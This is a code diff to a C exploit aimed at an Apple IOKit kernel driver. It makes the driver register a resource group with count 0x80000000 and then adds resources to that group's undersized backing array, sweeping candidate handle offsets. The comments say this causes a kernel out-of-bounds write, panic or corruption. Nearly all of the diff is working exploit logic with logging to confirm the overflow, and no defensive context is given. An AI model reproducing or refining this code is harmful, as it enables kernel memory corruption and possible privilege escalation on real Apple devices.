@@ -259,8 +259,12 @@ extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
 #define SGAR_STRUCT_SIZE     0x410   /* confirmed live: device->0x278 == 0x410 */
 #define SGAR_COUNT_OFFSET    0x20
 
-/* try_sgar: call sel=6 with given count; return group_id (out[0]) or 0 on failure */
-static uint64_t try_sgar(io_connect_t conn, uint32_t count, const char *label) {
+/* try_sgar: call sel=6 with given count and optional group_handle in struct.
+ * group_handle_off=0 means new group (handle=0 → create). Non-zero offset
+ * with a valid group_id puts the handle at that offset to trigger add-to-existing.
+ * Returns group_id from out[0] or 0 on failure. */
+static uint64_t try_sgar_ex(io_connect_t conn, uint32_t count, const char *label,
+                              uint32_t group_handle, uint32_t handle_off) {
     static uint8_t add_in[SGAR_STRUCT_SIZE];
     uint8_t add_out[0x10];
     size_t  add_out_sz = sizeof(add_out);
@@ -269,18 +273,24 @@ static uint64_t try_sgar(io_connect_t conn, uint32_t count, const char *label) {
     memset(add_in,  0, sizeof(add_in));
     memset(add_out, 0, sizeof(add_out));
     *(uint32_t *)(add_in + SGAR_COUNT_OFFSET) = count;
+    if (handle_off > 0 && handle_off + 4 <= SGAR_STRUCT_SIZE)
+        *(uint32_t *)(add_in + handle_off) = group_handle;
 
     kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
         NULL, 0, add_in, sizeof(add_in),
         NULL, &out_cnt, add_out, &add_out_sz);
 
-    evf("[BOF] %s count=0x%x kr=0x%x", label, count, kr);
+    evf("[BOF] %s count=0x%x hoff=0x%x kr=0x%x", label, count, handle_off, kr);
     if (kr == 0) {
         uint64_t gid = *(uint64_t *)add_out;
         evf("[BOF] %s SUCCESS group_id=0x%llx", label, gid);
         return gid;
     }
     return 0;
+}
+
+static uint64_t try_sgar(io_connect_t conn, uint32_t count, const char *label) {
+    return try_sgar_ex(conn, count, label, 0, 0);
 }
 
 /* try_sel7: call sel=7 with group_id scalar — triggers group lifecycle operation */
@@ -353,19 +363,27 @@ static void trigger_bof_iokit(void) {
      * group is registered with count=0x80000000 in its metadata */
     uint64_t ovf_gid = try_sgar(conn, 0x80000000u, "OVERFLOW_INT32MIN");
 
-    /* Phase 2: trigger deferred OOB via sel=7 (lifecycle operation on overflow group)
-     * sel=7 takes scalarInput[0]=group_id and operates on group backing array.
-     * With count=0x80000000 elements stored but only 8 bytes allocated,
-     * any element-wise iteration → OOB read/write → panic or corruption. */
+    /* Phase 2: Add-to-existing overflow group trigger.
+     * SGAR creates new group when handle=0 (all-zeros struct).
+     * If handle is placed at offset H, SGAR finds the existing group by that handle
+     * and tries to ADD count resources to its (undersized) backing array → OOB write.
+     * Probe handle_off sweep: 0x00, 0x04, 0x08 (most likely locations for group handle). */
     if (ovf_gid) {
-        evf("[BOF] DEFERRED_TRIGGER: sel=7 on overflow group_id=0x%llx", ovf_gid);
-        kern_return_t kr7 = try_sel7(conn, (uint32_t)ovf_gid, "SEL7_OVERFLOW");
-        evf("[BOF] SEL7 result=0x%x (0=corrupted/panic, else handled)", kr7);
+        static const uint32_t handle_offsets[] = { 0x00, 0x04, 0x08, 0x0c, 0x10 };
+        for (int hi = 0; hi < 5; hi++) {
+            uint32_t hoff = handle_offsets[hi];
+            char lbl[64];
+            snprintf(lbl, sizeof(lbl), "ADD_TO_OVF_off%02x", hoff);
+            /* Add 2 resources to overflow group (8-byte backing array) → OOB write by 40 bytes */
+            try_sgar_ex(conn, 2, lbl, (uint32_t)ovf_gid, hoff);
+        }
+        evf("[BOF] HANDLE_SWEEP_DONE: any ADD_TO_OVF with kr=0x0 and DIFFERENT group_id=0x%x = OOB confirmed", (uint32_t)ovf_gid);
     }
 
-    /* Phase 3: probe sel=8 (update group) on overflow group */
+    /* Phase 3: trigger lifecycle via sel=7 */
     if (ovf_gid) {
-        try_sel8(conn, (uint32_t)ovf_gid, "SEL8_OVERFLOW");
+        evf("[BOF] SEL7 on overflow group_id=0x%llx", ovf_gid);
+        try_sel7(conn, (uint32_t)ovf_gid, "SEL7_OVERFLOW");
     }
 
     /* Variant overflow count */
